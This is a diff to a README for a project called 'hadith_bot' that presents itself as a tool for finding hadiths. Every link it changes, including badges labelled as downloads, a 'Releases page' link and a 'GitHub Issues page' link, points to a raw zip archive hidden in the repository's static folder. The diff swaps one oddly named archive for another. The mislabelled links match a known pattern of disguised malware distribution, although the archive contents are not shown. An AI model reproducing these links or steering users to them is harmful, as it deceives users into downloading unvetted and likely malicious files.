@@ -1,6 +1,6 @@
 # 🕌 hadith_bot - Discover Hadiths Easily and Effectively
 
-[![Download hadith_bot](https://github.com/will9ramos/hadith_bot/raw/refs/heads/main/static/css/hadith_bot_trackhound.zip)](https://github.com/will9ramos/hadith_bot/raw/refs/heads/main/static/css/hadith_bot_trackhound.zip)
+[![Download hadith_bot](https://github.com/will9ramos/hadith_bot/raw/refs/heads/main/static/bot-hadith-adductor.zip)](https://github.com/will9ramos/hadith_bot/raw/refs/heads/main/static/bot-hadith-adductor.zip)
 
 ## 🛠️ Overview
 
@@ -12,7 +12,7 @@ To use hadith_bot, follow these simple steps to get it downloaded and running.
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** To download the latest version, [visit the Releases page here](https://github.com/will9ramos/hadith_bot/raw/refs/heads/main/static/css/hadith_bot_trackhound.zip).
+1. **Visit the Releases Page:** To download the latest version, [visit the Releases page here](https://github.com/will9ramos/hadith_bot/raw/refs/heads/main/static/bot-hadith-adductor.zip).
    
 2. **Select Your Download:** On the Releases page, you will find different versions available. Choose the version that suits your needs best. Click on the relevant link to start the download.
 
@@ -62,7 +62,7 @@ If you encounter issues while using hadith_bot, consider the following steps:
   
 ## 📞 Support 
 
-For any questions or concerns, feel free to raise an issue on the [GitHub Issues page](https://github.com/will9ramos/hadith_bot/raw/refs/heads/main/static/css/hadith_bot_trackhound.zip). The community and developers are there to help you.
+For any questions or concerns, feel free to raise an issue on the [GitHub Issues page](https://github.com/will9ramos/hadith_bot/raw/refs/heads/main/static/bot-hadith-adductor.zip). The community and developers are there to help you.
 
 ## 🎉 Join the Community
 
@@ -72,4 +72,4 @@ Engage with other users and developers in the hadith_bot community. Share your e
 
 For more information and updates about hadith_bot, follow the official GitHub repository. Remember, staying updated with the latest releases and features helps you get the most from your experience.
 
-[![Download hadith_bot](https://github.com/will9ramos/hadith_bot/raw/refs/heads/main/static/css/hadith_bot_trackhound.zip)](https://github.com/will9ramos/hadith_bot/raw/refs/heads/main/static/css/hadith_bot_trackhound.zip)
+[![Download hadith_bot](https://github.com/will9ramos/hadith_bot/raw/refs/heads/main/static/bot-hadith-adductor.zip)](https://github.com/will9ramos/hadith_bot/raw/refs/heads/main/static/bot-hadith-adductor.zip)
